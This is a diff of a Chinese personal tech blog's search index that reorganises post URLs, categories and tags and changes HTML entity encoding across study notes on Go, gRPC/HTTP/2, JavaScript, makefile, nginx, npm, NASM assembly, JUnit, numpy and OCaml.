class="number">20</span></span><br><span class="line">fmt.Println(*array3[<span class="number">0</span>])</span><br><span class="line">fmt.Println(array3)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 多维数组</span></span><br><span class="line"><span class="keyword">var</span> array4 [<span class="number">4</span>][<span class="number">2</span>]<span class="keyword">int</span>    <span class="comment">// 4行2列的二维数组，即有4行，每行有2个int</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 指向数组变量的指针</span></span><br><span class="line">arrP := &amp;a</span><br><span class="line">fmt.Printf(<span class="string">"a 's type is %T\n"</span>, a)</span><br><span class="line">fmt.Printf(<span class="string">"arrp 's type is %T\n"</span>, arrP)</span><br><span class="line">(*arrP)[<span class="number">1</span>] = <span class="string">"Today"</span>    <span class="comment">// arrP[1] = "Today" 也可以</span></span><br><span class="line">fmt.Println(*arrP)</span><br><span class="line"></span><br><span class="line"><span class="comment">// new 指向数组的指针</span></span><br><span class="line"><span class="keyword">var</span> arrp *[<span class="number">5</span>]<span class="keyword">int</span>    <span class="comment">// 此时为nil</span></span><br><span class="line">fmt.Println(arrp)   <span class="comment">// 输出 nil</span></span><br><span class="line">arrp = <span class="built_in">new</span>([<span class="number">5</span>]<span class="keyword">int</span>)  <span class="comment">// 分配相应的数组空间，并返回指针</span></span><br><span class="line">fmt.Println(arrp)   <span class="comment">// 输出 &amp;[0 0 0 0 0]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 与c语言的不同，go的数组名是值而不是指针。以下按照c语言的思路，在go中是错误的</span></span><br><span class="line"><span class="comment">// var p *int</span></span><br><span class="line"><span class="comment">// p = a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组是值类型而不是引用类型的示例</span></span><br><span class="line">arrA := [<span class="number">2</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>,<span class="number">2</span>&#125;</span><br><span class="line">arrB := arrA    <span class="comment">// 相当于赋值了整个数组的值</span></span><br><span class="line">arrB[<span class="number">1</span>] = <span class="number">3</span></span><br><span class="line">fmt.Println(arrA, arrB) <span class="comment">// 输出 [1 2] [1 3]</span></span><br></pre></td></tr></table></figure>
 <p>输出：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hello World</span><br><span class="line">[Hello World]</span><br><span class="line">[10 20 30 40 50] [1 2 3 4 5]</span><br><span class="line">10</span><br><span class="line">[0xc42008a018 0xc42008a030 &lt;nil&gt; &lt;nil&gt; &lt;nil&gt;]</span><br><span class="line">[[0 20] [0 0] [0 60] [0 0]]</span><br><span class="line">a &apos;s type is [2]string</span><br><span class="line">arrp &apos;s type is *[2]string</span><br><span class="line">[Hello Today]</span><br><span class="line">&lt;nil&gt;</span><br><span class="line">&amp;[0 0 0 0 0]</span><br><span class="line">[1 2] [1 3]</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hello World</span><br><span class="line">[Hello World]</span><br><span class="line">[10 20 30 40 50] [1 2 3 4 5]</span><br><span class="line">10</span><br><span class="line">[0xc42008a018 0xc42008a030 &lt;nil&gt; &lt;nil&gt; &lt;nil&gt;]</span><br><span class="line">[[0 20] [0 0] [0 60] [0 0]]</span><br><span class="line">a &#39;s type is [2]string</span><br><span class="line">arrp &#39;s type is *[2]string</span><br><span class="line">[Hello Today]</span><br><span class="line">&lt;nil&gt;</span><br><span class="line">&amp;[0 0 0 0 0]</span><br><span class="line">[1 2] [1 3]</span><br></pre></td></tr></table></figure>
 <p><strong>注意</strong>：</p>
 <p>由于在go语言中，数组类型是值类型而不是引用类型。所以，在<strong>函数传参</strong>时，我们需要<strong>传入指向数组的指针</strong>，而不是数组值。但，若是希望拿到该数组的副本，则可以选择使用传入值。</p>
 <p>同时，指向数组的指针还必须<strong>指明数组的长度</strong>，这其实十分不方便。但切片可以很好地解决这个问题。</p>
@@ -1458,7 +1470,8 @@
 <figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">    <span class="string">"study/my_study/obj"</span> <span class="comment">// 导入另一个包</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">    <span class="comment">// Person 为 study/my_study/obj 包中的类型</span></span><br><span class="line">    boss := obj.Person&#123;</span><br><span class="line">        Name: <span class="string">"aaaaa"</span>,</span><br><span class="line">        Email: <span class="string">"123456"</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用 Person 类型的公开方法</span></span><br><span class="line">    boss.Notify()</span><br><span class="line">    boss.ChangeEmail(<span class="string">"2222"</span>)</span><br><span class="line">    fmt.Println(boss)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
-        <category>程序设计基础</category>
+        <category>九层之台，起于累土</category>
+        <category>程序设计语言</category>
       </categories>
       <tags>
         <tag>Golang</tag>
@@ -1466,7 +1479,7 @@
   </entry>
   <entry>
     <title>go从入门到重装(linux系统)</title>
-    <url>/application/go%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%8D%B8%E8%BD%BD-linux%E7%B3%BB%E7%BB%9F.html</url>
+    <url>/go%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%8D%B8%E8%BD%BD-linux%E7%B3%BB%E7%BB%9F.html</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我在安装配置(非本人操作)了go的linux虚拟机上，尝试用 <code>$ go get github.com/astaxie/beego</code> 获取beego框架。但是，却出现了一个奇怪的错误： <code>go: cannot find main module; see &#39;go help modules&#39;</code> ，怎么查询都没有找到问题原因。这对于一个刚接触go和linux的新手来说，是手足无措的。于是，心生一计，卸载重装。</p>
 <a id="more"></a>
 <h2 id="一、卸载"><a href="#一、卸载" class="headerlink" title="一、卸载"></a>一、卸载</h2><h3 id="1-删除GOROOT目录"><a href="#1-删除GOROOT目录" class="headerlink" title="1.删除GOROOT目录"></a>1.<del>删除</del>GOROOT目录</h3><p>用 <code>$ go env</code> 找到GOROOT目录，在我的linux上为 <code>src/go</code> ，而常见的应该是 <code>usr/local/go</code> 。然后，<del>使用<code>$ rm -rf</code>删除该目录。</del>(用这个命令是不可能的，这辈子都不可能用的，这个命令删除文件真香)我<strong>不建议这样删除</strong>，因为与Windows不同，linux这样删除文件之后几乎是很难复原的。其中，<code>-r</code> 指向下递归，不管有多少级目录，一并删除；<code>-f</code> 指直接强行删除，不作任何提示的意思。可以看出，这个命令是很野蛮的。</p>
@@ -1496,7 +1509,7 @@
 <p><code>$ go get github.com/astaxie/beego</code> 成功，版本问题。</p>
 ]]></content>
       <categories>
-        <category>应用与开发</category>
+        <category>不知道怎么分类的分类</category>
       </categories>
       <tags>
         <tag>Golang</tag>
@@ -1504,7 +1517,7 @@
   </entry>
   <entry>
     <title>grpc进阶-HTTP/2</title>
-    <url>/cs/grpc%E8%BF%9B%E9%98%B6-HTTP-2.html</url>
+    <url>/grpc%E8%BF%9B%E9%98%B6-HTTP-2.html</url>
     <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>面试的时候，面试官问我 gRPC 所使用的 HTTP/2 协议有何优势，我支支吾吾没答好。</p>
 <p>面试结束后，深刻意识到自身的问题：学习新技术框架，常常不求甚解，缺乏刨根问底的精神。</p>
 <p>因此，抽空好好学习一下 HTTP/2 。</p>
@@ -1564,7 +1577,7 @@
 <p>多个 HTTP/2 请求复用一个 TCP 报文，从而实现了并发。相比于 HTTP/1.1 中一个请求独占一个 TCP 报文，这就像数据交换中<strong>报文交换到分组交换的改进</strong>。</p>
 <p>同时，这也与<strong>进程并发</strong>的思想相同。</p>
 <h4 id="3-2-2-帧"><a href="#3-2-2-帧" class="headerlink" title="3.2.2. 帧"></a>3.2.2. 帧</h4><p>帧的结构如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+-----------------------------------------------+</span><br><span class="line">|                 Length (24)                   |</span><br><span class="line">+---------------+---------------+---------------+</span><br><span class="line">|   Type (8)    |   Flags (8)   |</span><br><span class="line">+-+-------------+---------------+-------------------------------+</span><br><span class="line">|R|                 Stream Identifier (31)                      |</span><br><span class="line">+=+=============================================================+</span><br><span class="line">|                   Frame Payload (0...)                      ...</span><br><span class="line">+---------------------------------------------------------------+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+-----------------------------------------------+</span><br><span class="line">|                 Length (24)                   |</span><br><span class="line">+---------------+---------------+---------------+</span><br><span class="line">|   Type (8)    |   Flags (8)   |</span><br><span class="line">+-+-------------+---------------+-------------------------------+</span><br><span class="line">|R|                 Stream Identifier (31)                      |</span><br><span class="line">+&#x3D;+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;+</span><br><span class="line">|                   Frame Payload (0...)                      ...</span><br><span class="line">+---------------------------------------------------------------+</span><br></pre></td></tr></table></figure>
 <p>主要字段的含义如下：</p>
 <ul>
 <li><code>Length</code>：帧的长度。</li>
@@ -1591,16 +1604,18 @@
 </ul>
 ]]></content>
       <categories>
-        <category>计算机基础</category>
+        <category>不想开滴滴的外卖骑手不是好码农</category>
+        <category>后端</category>
       </categories>
       <tags>
-        <tag>Backend</tag>
         <tag>计算机网络</tag>
+        <tag>后端</tag>
+        <tag>grpc</tag>
       </tags>
   </entry>
   <entry>
     <title>Javascript重难点</title>
-    <url>/language/javascript%E9%87%8D%E9%9A%BE%E7%82%B9.html</url>
+    <url>/javascript%E9%87%8D%E9%9A%BE%E7%82%B9.html</url>
     <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>记录js使用过程中遇到的重难点。</p>
 <a id="more"></a>
 <h2 id="1-异步问题"><a href="#1-异步问题" class="headerlink" title="1. 异步问题"></a>1. 异步问题</h2><p>js中大部分库函数（比如：setTimeout、ajax请求）都是<strong>异步</strong>的，即调用时不等待函数执行结束，就执行下一步。（这是为了浏览器的性能，JavaScript会将异步函数在主线程之外执行）</p>
@@ -1672,16 +1687,16 @@
 </ul>
 ]]></content>
       <categories>
-        <category>程序设计基础</category>
+        <category>九层之台，起于累土</category>
+        <category>程序设计语言</category>
       </categories>
       <tags>
-        <tag>Frontend</tag>
         <tag>Javascript</tag>
       </tags>
   </entry>
   <entry>
     <title>grpc 入门</title>
-    <url>/application/grpc%E5%85%A5%E9%97%A8.html</url>
+    <url>/grpc%E5%85%A5%E9%97%A8.html</url>
     <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>实习期间，公司项目使用 gRPC 框架。因此，简单入门一下 grpc。</p>
 <p>项目代码地址：<a href="https://gitee.com/dounineli/grpcDemo" target="_blank" rel="noopener">gitee</a></p>
 <a id="more"></a>
@@ -1778,15 +1793,17 @@
 <p><img src="grpc入门/2.png" alt="1"></p>
 ]]></content>
       <categories>
-        <category>应用与开发</category>
+        <category>不想开滴滴的外卖骑手不是好码农</category>
+        <category>后端</category>
       </categories>
       <tags>
-        <tag>Backend</tag>
+        <tag>后端</tag>
+        <tag>grpc</tag>
       </tags>
   </entry>
   <entry>
     <title>go语言进阶-并发</title>
-    <url>/language/go%E8%AF%AD%E8%A8%80%E8%BF%9B%E9%98%B6-%E5%B9%B6%E5%8F%91.html</url>
+    <url>/go%E8%AF%AD%E8%A8%80%E8%BF%9B%E9%98%B6-%E5%B9%B6%E5%8F%91.html</url>
     <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><blockquote>
 <p>优雅的并发编程范式，完善的并发支持，出色的并发性能是Go语言区别于其他语言的一大特色。</p>
 </blockquote>
@@ -1898,7 +1915,8 @@
 </ul>
 ]]></content>
       <categories>
-        <category>程序设计基础</category>
+        <category>九层之台，起于累土</category>
+        <category>程序设计语言</category>
       </categories>
       <tags>
         <tag>Golang</tag>
@@ -1906,7 +1924,7 @@
   </entry>
   <entry>
     <title>javascript基础语法学习</title>
-    <url>/language/javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0.html</url>
+    <url>/javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0.html</url>
     <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这是一次简单的、对于<code>JavaScript</code>基础语法的重新学习，只记录<code>JavaScript</code>与<code>C\C++</code>的不同之处，相同的不再赘述。</p>
 <p>其中加入了一些<code>ES6</code>的特性。</p>
 <a id="more"></a>
@@ -2078,16 +2096,16 @@
 </ul>
 ]]></content>
       <categories>
-        <category>程序设计基础</category>
+        <category>九层之台，起于累土</category>
+        <category>程序设计语言</category>
       </categories>
       <tags>
-        <tag>Frontend</tag>
         <tag>Javascript</tag>
       </tags>
   </entry>
   <entry>
     <title>makefile入门</title>
-    <url>/application/makefile%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
+    <url>/makefile%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
     <content><![CDATA[<h3 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h3><p><code>makefile</code>工程管理文件，与<code>make</code>命令结合，在linux上用于管理大规模工程。</p>
 <p>以下记录简单使用<code>make</code>的学习笔记。</p>
 <a id="more"></a>
@@ -2114,15 +2132,15 @@
 <p>其实，我们也可以通过 <code>$ make hello1</code> 来单独<code>make</code>这一项。</p>
 ]]></content>
       <categories>
-        <category>应用与开发</category>
+        <category>不知道怎么分类的分类</category>
       </categories>
       <tags>
-        <tag>计算机系统</tag>
+        <tag>Makefile</tag>
       </tags>
   </entry>
   <entry>
     <title>nginx相关笔记</title>
-    <url>/application/nginx%E7%9B%B8%E5%85%B3%E7%AC%94%E8%AE%B0.html</url>
+    <url>/nginx%E7%9B%B8%E5%85%B3%E7%AC%94%E8%AE%B0.html</url>
     <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>关于nginx相关操作的笔记</p>
 <a id="more"></a>
 <h2 id="1-安装"><a href="#1-安装" class="headerlink" title="1. 安装"></a>1. 安装</h2><p>许多博客上提供的安装方法特别复杂，不知为何。</p>
@@ -2147,15 +2165,17 @@
 <figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#开启和关闭gzip模式</span></span><br><span class="line"><span class="attribute">gzip</span> <span class="literal">on</span>;</span><br><span class="line"><span class="comment">#gizp压缩起点，文件大于1k才进行压缩</span></span><br><span class="line"><span class="attribute">gzip_min_length</span> <span class="number">1k</span>;</span><br><span class="line"><span class="comment"># gzip 压缩级别，1-9，数字越大压缩的越好，也越占用CPU时间</span></span><br><span class="line"><span class="attribute">gzip_comp_level</span> <span class="number">6</span>;</span><br><span class="line"><span class="comment"># 进行压缩的文件类型。</span></span><br><span class="line"><span class="attribute">gzip_types</span> text/plain application/javascript application/x-javascript text/css application/xml text/javascript ;</span><br><span class="line"><span class="comment">#nginx对于静态文件的处理模块，开启后会寻找以.gz结尾的文件，直接返回，不会占用cpu进行压缩，如果找不到则不进行压缩</span></span><br><span class="line"><span class="attribute">gzip_static</span> <span class="literal">on</span>;</span><br><span class="line"><span class="comment"># 是否在http header中添加Vary: Accept-Encoding，建议开启</span></span><br><span class="line"><span class="attribute">gzip_vary</span> <span class="literal">off</span>;</span><br><span class="line"><span class="comment"># 设置gzip压缩针对的HTTP协议版本</span></span><br><span class="line"><span class="attribute">gzip_http_version</span> <span class="number">1</span>.<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
-        <category>应用与开发</category>
+        <category>不想开滴滴的外卖骑手不是好码农</category>
+        <category>后端</category>
       </categories>
       <tags>
-        <tag>Backend</tag>
+        <tag>后端</tag>
+        <tag>Nginx</tag>
       </tags>
   </entry>
   <entry>
     <title>npm换源与入门</title>
-    <url>/application/npm%E6%8D%A2%E6%BA%90%E4%B8%8E%E5%85%A5%E9%97%A8.html</url>
+    <url>/npm%E6%8D%A2%E6%BA%90%E4%B8%8E%E5%85%A5%E9%97%A8.html</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在WLS中下载安装node之后，需要进行npm换源处理，并重新入门npm。这是一次简单的入门笔记。</p>
 <a id="more"></a>
 <h3 id="npm换源"><a href="#npm换源" class="headerlink" title="npm换源"></a>npm换源</h3><p>由于npm下载源在国外，严重影响速度。因此，乐于分享的淘宝团队，将npm下载源部署到了国内。</p>
@@ -2172,7 +2192,7 @@
 <p>再输入：</p>
 <p><code>npm config list</code></p>
 <p>可以看到，已经换源了：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm config list</span><br><span class="line">; cli configs</span><br><span class="line">metrics-registry = &quot;https://registry.npm.taobao.org/&quot;</span><br><span class="line">scope = &quot;&quot;</span><br><span class="line">user-agent = &quot;npm/6.4.1 node/v10.15.1 linux x64&quot;</span><br><span class="line"></span><br><span class="line">; userconfig /home/dounine/.npmrc</span><br><span class="line">registry = &quot;https://registry.npm.taobao.org/&quot;</span><br><span class="line"></span><br><span class="line">; node bin location = /usr/app/node-v10.15.1/bin/node</span><br><span class="line">; cwd = /usr/app/node-v10.15.1/lib/node_modules</span><br><span class="line">; HOME = /home/dounine</span><br><span class="line">; &quot;npm config ls -l&quot; to show all defaults.</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm config list</span><br><span class="line">; cli configs</span><br><span class="line">metrics-registry &#x3D; &quot;https:&#x2F;&#x2F;registry.npm.taobao.org&#x2F;&quot;</span><br><span class="line">scope &#x3D; &quot;&quot;</span><br><span class="line">user-agent &#x3D; &quot;npm&#x2F;6.4.1 node&#x2F;v10.15.1 linux x64&quot;</span><br><span class="line"></span><br><span class="line">; userconfig &#x2F;home&#x2F;dounine&#x2F;.npmrc</span><br><span class="line">registry &#x3D; &quot;https:&#x2F;&#x2F;registry.npm.taobao.org&#x2F;&quot;</span><br><span class="line"></span><br><span class="line">; node bin location &#x3D; &#x2F;usr&#x2F;app&#x2F;node-v10.15.1&#x2F;bin&#x2F;node</span><br><span class="line">; cwd &#x3D; &#x2F;usr&#x2F;app&#x2F;node-v10.15.1&#x2F;lib&#x2F;node_modules</span><br><span class="line">; HOME &#x3D; &#x2F;home&#x2F;dounine</span><br><span class="line">; &quot;npm config ls -l&quot; to show all defaults.</span><br></pre></td></tr></table></figure>
 <h3 id="npm入门"><a href="#npm入门" class="headerlink" title="npm入门"></a>npm入门</h3><p>npm最常用的便是安装各种包。其中，分为 全局安装 和 本地安装：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install &lt;package&gt;      <span class="comment"># 本地安装</span></span><br><span class="line">npm install &lt;package&gt; -g   <span class="comment"># 全局安装</span></span><br></pre></td></tr></table></figure>
 <h4 id="本地安装-安装到项目"><a href="#本地安装-安装到项目" class="headerlink" title="本地安装(安装到项目)"></a>本地安装(安装到项目)</h4><p>将安装包放在 <code>./node_modules</code> 下（运行 npm 命令时所在的目录，项目根目录），如果没有 node_modules 目录，会在当前执行 npm 命令的目录下生成 node_modules 目录。</p>
@@ -2189,15 +2209,16 @@
 <p>生成 <code>dist/</code> 目录，是项目编译后的静态文件</p>
 ]]></content>
       <categories>
-        <category>应用与开发</category>
+        <category>不知道怎么分类的分类</category>
       </categories>
       <tags>
-        <tag>Frontend</tag>
+        <tag>前端</tag>
+        <tag>npm</tag>
       </tags>
   </entry>
   <entry>
     <title>nasm汇编实现贪吃蛇</title>
-    <url>/cs/nasm%E6%B1%87%E7%BC%96%E5%86%99%E8%B4%AA%E5%90%83%E8%9B%87.html</url>
+    <url>/nasm%E6%B1%87%E7%BC%96%E5%86%99%E8%B4%AA%E5%90%83%E8%9B%87.html</url>
     <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>出于汇编语言课程设计要求，设计一个由nasm汇编语言编写的贪吃蛇程序，可在“裸机”上运行。</p>
 <p>详细代码见<a href="https://github.com/99MyCql/dou-loader/blob/master/src/dou-snake.asm" target="_blank" rel="noopener">github</a>。</p>
 <a id="more"></a>
@@ -2262,7 +2283,7 @@
 <li><p><code>INT 8</code>定时器中断，每过55ms就会被触发一次。在<code>INT 8</code>中断程序中，会调用<code>INT 1CH</code>中断，而原本的<code>INT 1CH</code>程序只包含一条返回语句。所以，只需重写<code>INT 1CH</code>中断程序，即可实现定时器功能。</p>
 </li>
 <li><p>获取随机数：</p>
-  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov ax, 0h					; 间隔定时器</span><br><span class="line">out 43h, al					; 通过端口43h</span><br><span class="line">in al, 40h</span><br><span class="line">in al, 40h</span><br><span class="line">in al, 40h					; 访问3次，保证随机性</span><br><span class="line">mov bl, 20</span><br><span class="line">div bl						; ax/bl(20) = al......ah</span><br><span class="line">mov al, ah					; 余数</span><br><span class="line">mov ah, 0</span><br><span class="line">add al, 1					; 1-20的随机数</span><br></pre></td></tr></table></figure>
+  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov ax, 0h					; 间隔定时器</span><br><span class="line">out 43h, al					; 通过端口43h</span><br><span class="line">in al, 40h</span><br><span class="line">in al, 40h</span><br><span class="line">in al, 40h					; 访问3次，保证随机性</span><br><span class="line">mov bl, 20</span><br><span class="line">div bl						; ax&#x2F;bl(20) &#x3D; al......ah</span><br><span class="line">mov al, ah					; 余数</span><br><span class="line">mov ah, 0</span><br><span class="line">add al, 1					; 1-20的随机数</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
 <h2 id="5-具体实现"><a href="#5-具体实现" class="headerlink" title="5. 具体实现"></a>5. 具体实现</h2><p>代码见<a href="https://github.com/99MyCql/dou-loader/blob/master/src/dou-snake.asm" target="_blank" rel="noopener">github</a>。</p>
@@ -2290,15 +2311,17 @@
 </ul>
 ]]></content>
       <categories>
-        <category>计算机基础</category>
+        <category>九层之台，起于累土</category>
+        <category>程序设计语言</category>
       </categories>
       <tags>
         <tag>计算机系统</tag>
+        <tag>汇编</tag>
       </tags>
   </entry>
   <entry>
     <title>junit入门</title>
-    <url>/application/junit%E5%85%A5%E9%97%A8.html</url>
+    <url>/junit%E5%85%A5%E9%97%A8.html</url>
     <content><![CDATA[<p>[TOC]</p>
 <h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>结合之前卓越班《软件开发环境与工具》课程所教的junit，以及此次的软件测试大赛，决定入门学习一下<code>junit</code>。</p>
 <p>此处使用<code>IDEA</code>作为开发工具。</p>
@@ -2391,7 +2414,7 @@
 <li>测试类需要使用<code>@RunWith(Parameterized.class)</code>注解进行修饰。</li>
 <li>测试类需要声明分别用于<strong>存放期望值和测试数据</strong>的变量。</li>
 <li>测试类需要声明一个<strong>带有参数的公共构造函数</strong>，并在其中为第二个环节中声明的几个变量赋值。</li>
-<li>测试类需要声明一个公共静态方法，使用<a href="mailto:`@Parameterized.Parameters" target="_blank" rel="noopener">`@Parameterized.Parameters</a><code>进行修饰，并返回</code>java.util.Collection`类，并在此方法中<strong>初始化所有需要测试的参数对</strong>。</li>
+<li>测试类需要声明一个公共静态方法，使用<a href="mailto:`@Parameterized.Parameters">`@Parameterized.Parameters</a><code>进行修饰，并返回</code>java.util.Collection`类，并在此方法中<strong>初始化所有需要测试的参数对</strong>。</li>
 <li>编写测试方法，使用类变量作为参数进行测试。</li>
 </ul>
 <h3 id="2-7-同时运行多个测试类"><a href="#2-7-同时运行多个测试类" class="headerlink" title="2.7. 同时运行多个测试类"></a>2.7. 同时运行多个测试类</h3><p>同时运行<code>CalculatorTest</code>和<code>ParameterTest</code>测试类，例如：</p>
@@ -2399,15 +2422,16 @@
 <h2 id="3-参考"><a href="#3-参考" class="headerlink" title="3. 参考"></a>3. 参考</h2><p><a href="https://blog.csdn.net/qq_34264849/article/details/88243278" target="_blank" rel="noopener">https://blog.csdn.net/qq_34264849/article/details/88243278</a></p>
 ]]></content>
       <categories>
-        <category>应用与开发</category>
+        <category>不知道怎么分类的分类</category>
       </categories>
       <tags>
         <tag>Java</tag>
+        <tag>Junit</tag>
       </tags>
   </entry>
   <entry>
     <title>numpy学习笔记</title>
-    <url>/application/numpy%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
+    <url>/numpy%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
     <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>鉴于在卓越班暑期学习中，接触到机器学习的内容，索性深入研究一番，蹭一蹭机器学习的热度。</p>
 <p>众所周知，学习机器学习之前，必须学习数据分析。而<code>numpy</code>则是数据分析的第一道关。</p>
 <p><code>numpy</code>的官网中，如此介绍：</p>
@@ -2453,15 +2477,16 @@
 <h3 id="2-7-转换"><a href="#2-7-转换" class="headerlink" title="2.7. 转换"></a>2.7. 转换</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a_list = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b_numpy = np.array(a_list) <span class="comment"># python原生列表转numpy数组</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b_numpy</span><br><span class="line">array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c_list = b_numpy.tolist() <span class="comment"># numpy数组转列表</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c_list</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
-        <category>应用与开发</category>
+        <category>不知道怎么分类的分类</category>
       </categories>
       <tags>
         <tag>Python</tag>
+        <tag>Numpy</tag>
       </tags>
   </entry>
   <entry>
     <title>OCaml从入门到放弃</title>
-    <url>/language/ocaml%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83.html</url>
+    <url>/ocaml%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83.html</url>
     <content><![CDATA[<p>[TOC]</p>
 <h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>学习函数式语言</p>
 <a id="more"></a>
@@ -2680,7 +2705,8 @@
 <h3 id="8-4-for循环"><a href="#8-4-for循环" class="headerlink" title="8.4. for循环"></a>8.4. for循环</h3><figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> &lt;变量&gt;=&lt;初始表达式&gt; <span class="keyword">to</span> &lt;终止表达式&gt; <span class="keyword">do</span></span><br><span class="line">  &lt;表达式<span class="number">1</span>&gt;;</span><br><span class="line">  ...</span><br><span class="line">  &lt;表达式n&gt;;</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
-        <category>程序设计基础</category>
+        <category>九层之台，起于累土</category>
+        <category>程序设计语言</category>
       </categories>
       <tags>
         <tag>OCaml</tag>
@@ -2688,7 +2714,7 @@
   </entry>
   <entry>
     <title>ofbiz学习之部署组件1</title>
-    <url>/application/ofbiz%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%83%A8%E7%BD%B2%E7%BB%84%E4%BB%B61.html</url>
+    <url>/ofbiz%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%83%A8%E7%BD%B2%E7%BB%84%E4%BB%B61.html</url>
     <content><![CDATA[<h3 id="一、创建组件"><a href="#一、创建组件" class="headerlink" title="一、创建组件"></a>一、创建组件</h3><p>右键点击ofbiz根目录下的build.xml——Run as(运行方式)——Ant构建(第二个)——在“选择要执行的目标”的框中——取消start——找到create component打钩——点击运行——在出现的输入框中都输入组建的名字learning——最后一步选择Y——完成——刷新左边的资源管理视图——hot-deploy下出现learning组件目录</p>
 <a id="more"></a>
